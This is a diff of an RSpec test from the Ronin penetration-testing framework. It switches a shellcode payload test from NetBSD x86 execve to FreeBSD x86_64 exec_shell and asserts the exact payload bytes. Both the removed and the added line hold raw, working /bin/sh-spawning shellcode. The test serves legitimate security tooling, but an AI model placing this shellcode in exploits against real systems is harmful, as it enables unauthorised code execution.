@@ -1,7 +1,7 @@
 require 'spec_helper'
-require 'ronin/payloads/builtin/shellcode/netbsd/x86/execve'
+require 'ronin/payloads/builtin/shellcode/freebsd/x86_64/exec_shell'
 
-describe Ronin::Payloads::Shellcode::NetBSD::X86::Execve do
+describe Ronin::Payloads::Shellcode::FreeBSD::X86_64::ExecShell do
   it "must inherit from Ronin::Payloads::ShellcodePayload" do
     expect(described_class).to be < Ronin::Payloads::ShellcodePayload
   end
@@ -9,24 +9,24 @@ describe Ronin::Payloads::Shellcode::NetBSD::X86::Execve do
   describe ".id" do
     subject { described_class }
 
-    it "must equal 'shellcode/netbsd/x86/execve'" do
-      expect(subject.id).to eq('shellcode/netbsd/x86/execve')
+    it "must equal 'shellcode/freebsd/x86_64/exec_shell'" do
+      expect(subject.id).to eq('shellcode/freebsd/x86_64/exec_shell')
     end
   end
 
   describe ".arch" do
     subject { described_class }
 
-    it "must equal :x86" do
-      expect(subject.arch).to be(:x86)
+    it "must equal :x86_64" do
+      expect(subject.arch).to be(:x86_64)
     end
   end
 
   describe ".os" do
     subject { described_class }
 
-    it "must equal :netbsd" do
-      expect(subject.os).to be(:netbsd)
+    it "must equal :freebsd" do
+      expect(subject.os).to be(:freebsd)
     end
   end
 
@@ -35,7 +35,7 @@ describe Ronin::Payloads::Shellcode::NetBSD::X86::Execve do
 
     it "must set #payload" do
       expect(subject.payload).to eq(
-        "\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04".b
+        "\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05".b
       )
     end
 
